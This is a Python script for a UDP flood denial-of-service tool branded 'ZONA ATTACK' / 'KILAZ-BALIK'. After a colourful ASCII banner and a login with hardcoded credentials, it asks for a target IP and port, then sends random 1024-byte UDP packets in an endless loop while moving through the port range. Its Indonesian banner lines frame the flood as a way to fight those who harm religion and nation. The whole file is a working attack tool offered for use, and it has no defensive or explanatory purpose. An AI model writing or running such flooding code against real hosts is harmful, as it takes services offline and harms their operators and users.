# -*- coding: utf-8 -*-
import random
import socket
import threading
import os
import sys
import time
import fade
os.system("clear")

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1024)
#############

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    ZA1 = '\033[31m'
    ZA2 = '\033[32m'
    ZA3 = '\033[33m'
    FAIL = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    ZH = '\033[97m'

attemps = 0
os.system("clear")
print("")
print("\033[95m        @       @   @   @     @ @ @ @ @ @ @  @ @ @ @ @       \033[0m")
print("\033[95m        @     @     @   @      @         @          @        \033[0m")
print("\033[95m        @   @       @   @       @       @          @         \033[0m")
print("\033[31m        @ @         @   @        @     @          @          \033[0m")
print("\033[31m        @  @        @   @         @   @          @           \033[0m")   
print("\033[31m        @    @      @   @          @ @          @            \033[0m")
print("\033[31m        @      @    @   @ @ @ @ @   @          @ @ @ @ @     \033[0m")
print("")     
print("\033[91m            @ @ @       @ @    @         @   @     @         \033[0m")
print("\033[91m            @     @   @     @  @         @     @   @         \033[0m")
print("\033[94m            @ @ @     @     @  @         @       @ @         \033[0m")
print("\033[94m            @     @   @ @ @ @  @         @     @   @         \033[0m")
print("\033[94m            @ @ @     @     @  @ @ @ @   @   @     @         \033[0m")              
print("\033[94m_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_—_\033[0m")
print("\033[95m             SHOULD ONLY BE USED FOR GOOD PURPOSES               \033[0m")
print("\033[94m—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—_—_—_—_—_—_—_—_—_—_—_——_—_—_—__\033[0m")
while attemps < 100:
    username = input('\033[33mEnter your username: \033[0m')
    password = input('\033[94mEnter your password: \033[0m')

    if username == 'k0l4pz' and password == 'k0l4pz':
        print('\033[33m***WELCOME TO ZONA ATTACK!!***\033[0m')
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue


ip = str(input("\033[94mTarget IP :  \033[0m"))
port = int(input("\033[97mTarget Port :  \033[0m"))
threads = int(input("\033[92mThreads :  \033[0m"))
time.sleep(5),
print("\033[33m  ⟩⟩  SCRIPT INI... \033[0m "),
time.sleep(5),
print("\033[32m  ⟩⟩  HANYA BOLEH KAU GUNAKAN \033[0m "),
time.sleep(5),
print("\033[91m  ⟩⟩  UNTUK MEMBERANTAS \033[0m "),
time.sleep(5),
print("\033[98m  ⟩⟩  BAKTERI YG MERUGIKAN KEHIDUPAN \033[0m "),
time.sleep(5),
print("\033[96m  ⟩⟩  MERUSAK MORAL AGAMA & BANGSA \033[0m "),
time.sleep(5),
print("\033[97m  ⟩⟩  SERTA MEMBELA YG TERTINDAS..! \033[0m "),
time.sleep(5),

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print(f"\033[97m[💥\033[99mKILAZ-BALIK\033[97m]  Sent  \033[33mPacket:::.... " +ip+ "\033[0m" )
     print("\033[31m —— —— —— —— —— —— —— —— —— —— —— —— —— —— —— —— —— —— —— —— —— ——⟩⟩")
     print(f"\033[93m[💥\033[99mKILAZ-BALIK\033[93m]  Attack \033[1mThread:::.... " +ip+ "\033[0m" )
     print("\033[1m —— —— —— —— —— —— —— —— —— —— —— —— —— ——— —— —— —— —— —— —— —— ——⟩⟩")
     if port == 65534:
       port = 1
